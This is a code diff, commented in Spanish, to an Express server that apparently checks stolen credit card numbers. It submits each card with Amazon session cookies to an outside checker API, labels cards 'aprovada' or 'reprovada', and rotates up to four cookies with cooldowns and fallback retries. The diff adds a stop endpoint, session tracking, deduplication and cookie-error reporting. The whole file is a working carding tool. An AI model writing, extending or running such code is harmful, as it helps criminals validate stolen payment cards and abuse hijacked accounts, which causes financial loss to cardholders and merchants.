@@ -10,6 +10,9 @@ app.set('view engine', 'hbs');
 app.use(express.json());
 app.use(express.static('public'));
 
+// Control de sesiones activas
+const activeSessions = new Map();
+
 // Función para esperar un tiempo determinado (cooldown)
 const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
@@ -33,14 +36,16 @@ class CookieNode {
         this.cooldownTime = getCooldownTime(mode);
         this.queue = [];
         this.results = [];
+        this.stopped = false;
     }
 
     async processCard(card) {
+        if (this.stopped) return null;
+        
         console.log(`[NODO ${this.cookieIndex + 1}] 🔄 Procesando: ${card}`);
         
         const config = {
             method: 'get',
-            
             url: 'https://amz-us.amzkanefx.xyz/api.php',
             params: { lista: card, cookie: this.cookie },
             headers: {
@@ -52,6 +57,8 @@ class CookieNode {
         
         try {
             const response = await axios(config);
+            
+            if (this.stopped) return null;
             
             const status = response.data.includes('Aprovada') ? 'aprovada' :
                         response.data.includes('Reprovada') ? 'reprovada' :
@@ -67,6 +74,8 @@ class CookieNode {
                 cookieUsed: this.cookieIndex + 1
             };
         } catch (error) {
+            if (this.stopped) return null;
+            
             console.log(`[NODO ${this.cookieIndex + 1}] ❌ ERROR: ${error.message} - ${card}`);
             
             return {
@@ -90,24 +99,33 @@ class CookieNode {
         
         this.isProcessing = true;
         
-        while (this.queue.length > 0) {
+        while (this.queue.length > 0 && !this.stopped) {
             const card = this.queue.shift();
             const result = await this.processCard(card);
-            this.results.push(result);
             
-            // Notificar que hay un nuevo resultado disponible
-            if (this.onResultCallback) {
-                this.onResultCallback(result);
-            }
-            
-            // Aplicar cooldown solo si quedan tarjetas por procesar
-            if (this.queue.length > 0) {
-                console.log(`[NODO ${this.cookieIndex + 1}] ⏱️ Cooldown de ${this.cooldownTime}ms`);
-                await sleep(this.cooldownTime);
+            if (result && !this.stopped) {
+                this.results.push(result);
+                
+                // Notificar que hay un nuevo resultado disponible
+                if (this.onResultCallback) {
+                    this.onResultCallback(result);
+                }
+                
+                // Aplicar cooldown solo si quedan tarjetas por procesar
+                if (this.queue.length > 0 && !this.stopped) {
+                    console.log(`[NODO ${this.cookieIndex + 1}] ⏱️ Cooldown de ${this.cooldownTime}ms`);
+                    await sleep(this.cooldownTime);
+                }
             }
         }
         
         this.isProcessing = false;
+    }
+
+    stop() {
+        this.stopped = true;
+        this.queue = []; // Limpia la cola de tarjetas pendientes
+        console.log(`[NODO ${this.cookieIndex + 1}] 🛑 Procesamiento detenido`);
     }
 
     onResult(callback) {
@@ -149,6 +167,28 @@ const broadcastUpdate = (data) => {
     });
 };
 
+// Endpoint para detener un proceso
+app.post('/stop', (req, res) => {
+    const { sessionId } = req.body;
+    
+    if (!sessionId || !activeSessions.has(sessionId)) {
+        return res.status(400).json({ error: 'Sesión no encontrada' });
+    }
+    
+    const session = activeSessions.get(sessionId);
+    session.nodes.forEach(node => node.stop());
+    
+    broadcastUpdate({
+        type: 'stopped',
+        message: 'Procesamiento detenido por el usuario',
+        sessionId
+    });
+    
+    activeSessions.delete(sessionId);
+    
+    return res.json({ status: 'stopped', message: 'Procesamiento detenido' });
+});
+
 // Endpoint único para todos los modos
 app.post('/check', async (req, res) => {
     const { cards, cookie1, cookie2, cookie3, cookie4, mode } = req.body;
@@ -157,6 +197,9 @@ app.post('/check', async (req, res) => {
     if (!cards || !cards.length) {
         return res.status(400).json({ error: 'Faltan tarjetas' });
     }
+    
+    // Eliminar duplicados para evitar procesamiento repetido
+    const uniqueCards = [...new Set(cards)];
     
     // Crear array de cookies disponibles basado en inputs individuales
     const cookies = [];
@@ -173,7 +216,7 @@ app.post('/check', async (req, res) => {
     // Determinar el número de cookies según el modo
     const cookieCount = cookies.length;
     console.log(`[SISTEMA] 🚀 Iniciando verificación con ${cookieCount} cookie(s) en modo ${mode}`);
-    console.log(`[SISTEMA] 📋 Procesando ${cards.length} tarjetas`);
+    console.log(`[SISTEMA] 📋 Procesando ${uniqueCards.length} tarjetas únicas`);
     
     // Crear nodos de procesamiento para cada cookie
     const nodes = cookies.map((cookie, index) => {
@@ -190,17 +233,26 @@ app.post('/check', async (req, res) => {
         aprovadas: 0,
         reprovadas: 0,
         errors: 0,
+        cookieErrors: 0,
         cookiesUsadas: cookieCount,
         modo: mode
     };
     
     // Responder inmediatamente con un ID de sesión
     const sessionId = Date.now().toString();
+    
+    // Guardar la sesión activa
+    activeSessions.set(sessionId, {
+        nodes,
+        stats,
+        totalCards: uniqueCards.length
+    });
+    
     res.json({ 
         sessionId,
         status: 'processing',
         message: 'Procesamiento iniciado',
-        totalCards: cards.length
+        totalCards: uniqueCards.length
     });
     
     // Configurar callback de resultados para cada nodo
@@ -213,6 +265,18 @@ app.post('/check', async (req, res) => {
             stats.total = completedResults;
             if (result.status === 'aprovada') stats.aprovadas++;
             else if (result.status === 'reprovada') stats.reprovadas++;
+            else if (result.status === 'cookie-error') {
+                stats.errors++;
+                stats.cookieErrors++;
+                
+                // Notificar error de cookie específicamente
+                broadcastUpdate({
+                    type: 'cookie-error',
+                    message: 'Error de cookie detectado',
+                    data: result,
+                    sessionId
+                });
+            }
             else stats.errors++;
             
             // Enviar resultado en tiempo real a todos los clientes conectados
@@ -220,15 +284,15 @@ app.post('/check', async (req, res) => {
                 type: 'result',
                 data: result,
                 stats: { ...stats },
-                progress: (completedResults / cards.length) * 100,
+                progress: (completedResults / uniqueCards.length) * 100,
                 sessionId
             });
         });
     });
     
     // Distribuir tarjetas entre los nodos según el modo
-    for (let i = 0; i < cards.length; i++) {
-        const card = cards[i];
+    for (let i = 0; i < uniqueCards.length; i++) {
+        const card = uniqueCards[i];
         
         // Determinar qué nodo (cookie) usar según modo
         let nodeIndex;
@@ -237,10 +301,10 @@ app.post('/check', async (req, res) => {
             nodeIndex = 0;
         } else if (mode === 2 && cookieCount >= 2) {
             // Modo 2 (Medio): Dos cookies - 50% para cada una
-            nodeIndex = i < (cards.length / 2) ? 0 : 1;
+            nodeIndex = i < (uniqueCards.length / 2) ? 0 : 1;
         } else if ((mode === 3 || mode === 4) && cookieCount >= 4) {
             // Modo 3 (Diablo) o Modo 4 (Flash): Cuatro cookies - 25% para cada una
-            nodeIndex = Math.min(Math.floor(i / (cards.length / 4)), 3);
+            nodeIndex = Math.min(Math.floor(i / (uniqueCards.length / 4)), 3);
         } else if ((mode === 3 || mode === 4) && cookieCount === 3) {
             // Si pidió modo 3/4 pero solo hay 3 cookies
             nodeIndex = i % 3;
@@ -263,83 +327,118 @@ app.post('/check', async (req, res) => {
     
     // Procesar fallbacks con la primera cookie si hay errores
     const processAllResults = async () => {
-        // Esperar a que se completen todos los resultados iniciales
-        while (completedResults < cards.length) {
-            await sleep(500);
-        }
-        
-        // Procesar errores con fallback si es necesario
-        const finalResults = [];
-        const nodeFallbacks = [];
-        
-        // Primero procesar los resultados exitosos
-        for (const result of allResults) {
-            if (result.status !== 'error') {
-                finalResults.push(result);
-            } else {
-                // Si hay una cookie diferente disponible para fallback
-                if (cookieCount > 1) {
-                    nodeFallbacks.push(result);
-                } else {
-                    finalResults.push(result);
-                }
+        try {
+            // Esperar a que se completen todos los resultados iniciales
+            while (completedResults < uniqueCards.length && !nodes.some(node => node.stopped)) {
+                await sleep(500);
             }
-        }
-        
-        // Procesar fallbacks con la primera cookie si hay errores y más de una cookie
-        if (nodeFallbacks.length > 0 && cookieCount > 1) {
-            const fallbackNode = new CookieNode(cookies[0], 0, mode);
-            let fallbackResults = [];
             
-            // Configurar callback de resultados para el nodo de fallback
-            fallbackNode.onResult(result => {
-                result.wasBackup = true;
-                fallbackResults.push(result);
-                
-                // Actualizar estadísticas
-                if (result.status === 'aprovada') stats.aprovadas++;
-                else if (result.status === 'reprovada') stats.reprovadas++;
-                else stats.errors--;  // Restar el error anterior
-                
-                // Enviar resultado en tiempo real
+            // Si se detuvo el proceso, salir
+            if (nodes.some(node => node.stopped)) {
                 broadcastUpdate({
-                    type: 'result',
-                    data: result,
-                    stats: { ...stats },
-                    progress: 100,  // Ya completamos el progreso normal
-                    isBackup: true,
+                    type: 'stopped',
+                    message: 'Procesamiento detenido por el usuario',
                     sessionId
                 });
-            });
-            
-            // Añadir todas las tarjetas fallidas al nodo de fallback
-            for (const failedResult of nodeFallbacks) {
-                console.log(`[SISTEMA] 🔄 Intentando con cookie de respaldo para ${failedResult.card}`);
-                fallbackNode.addCard(failedResult.card);
+                return;
             }
             
-            // Esperar a que terminen todos los fallbacks
-            await new Promise(resolve => {
-                const checkInterval = setInterval(() => {
-                    if (fallbackResults.length === nodeFallbacks.length) {
-                        clearInterval(checkInterval);
-                        resolve();
+            // Procesar errores con fallback si es necesario
+            const finalResults = [];
+            const nodeFallbacks = [];
+            
+            // Primero procesar los resultados exitosos
+            for (const result of allResults) {
+                if (result.status !== 'error') {
+                    finalResults.push(result);
+                } else {
+                    // Si hay una cookie diferente disponible para fallback
+                    if (cookieCount > 1) {
+                        nodeFallbacks.push(result);
+                    } else {
+                        finalResults.push(result);
                     }
-                }, 500);
+                }
+            }
+            
+            // Procesar fallbacks con la primera cookie si hay errores y más de una cookie
+            if (nodeFallbacks.length > 0 && cookieCount > 1) {
+                const fallbackNode = new CookieNode(cookies[0], 0, mode);
+                let fallbackResults = [];
+                
+                // Configurar callback de resultados para el nodo de fallback
+                fallbackNode.onResult(result => {
+                    result.wasBackup = true;
+                    fallbackResults.push(result);
+                    
+                    // Actualizar estadísticas
+                    if (result.status === 'aprovada') stats.aprovadas++;
+                    else if (result.status === 'reprovada') stats.reprovadas++;
+                    else if (result.status === 'cookie-error') {
+                        // No restar error anterior para cookie-error
+                        stats.cookieErrors++;
+                        
+                        // Notificar error de cookie específicamente
+                        broadcastUpdate({
+                            type: 'cookie-error',
+                            message: 'Error de cookie detectado en fallback',
+                            data: result,
+                            sessionId
+                        });
+                    }
+                    else stats.errors--;  // Restar el error anterior
+                    
+                    // Enviar resultado en tiempo real
+                    broadcastUpdate({
+                        type: 'result',
+                        data: result,
+                        stats: { ...stats },
+                        progress: 100,  // Ya completamos el progreso normal
+                        isBackup: true,
+                        sessionId
+                    });
+                });
+                
+                // Añadir todas las tarjetas fallidas al nodo de fallback
+                for (const failedResult of nodeFallbacks) {
+                    console.log(`[SISTEMA] 🔄 Intentando con cookie de respaldo para ${failedResult.card}`);
+                    fallbackNode.addCard(failedResult.card);
+                }
+                
+                // Esperar a que terminen todos los fallbacks
+                await new Promise(resolve => {
+                    const checkInterval = setInterval(() => {
+                        if (fallbackResults.length === nodeFallbacks.length || fallbackNode.stopped) {
+                            clearInterval(checkInterval);
+                            resolve();
+                        }
+                    }, 500);
+                });
+                
+                // Añadir resultados de fallback
+                finalResults.push(...fallbackResults);
+            }
+            
+            // Notificar que el proceso está completo
+            broadcastUpdate({
+                type: 'complete',
+                stats: stats,
+                sessionId
             });
             
-            // Añadir resultados de fallback
-            finalResults.push(...fallbackResults);
+            // Limpiar la sesión activa
+            activeSessions.delete(sessionId);
+            
+            console.log(`[SISTEMA] ✅ Verificación completa: ${stats.aprovadas} aprobadas, ${stats.reprovadas} rechazadas, ${stats.errors} errores`);
+        } catch (err) {
+            console.error('[SISTEMA] ❌ Error en procesamiento:', err);
+            broadcastUpdate({
+                type: 'error',
+                message: 'Error en el procesamiento',
+                sessionId
+            });
+            activeSessions.delete(sessionId);
         }
-        
-        // Notificar que el proceso está completo
-        broadcastUpdate({
-            type: 'complete',
-            stats: stats,
-            sessionId
-        });
-        
-        console.log(`[SISTEMA] ✅ Verificación completa: ${stats.aprovadas} aprobadas, ${stats.reprovadas} rechazadas, ${stats.errors} errores`);
     };
     
     // Iniciar el proceso asíncrono
@@ -350,6 +449,7 @@ app.post('/check', async (req, res) => {
             message: 'Error en el procesamiento',
             sessionId
         });
+        activeSessions.delete(sessionId);
     });
 });
 
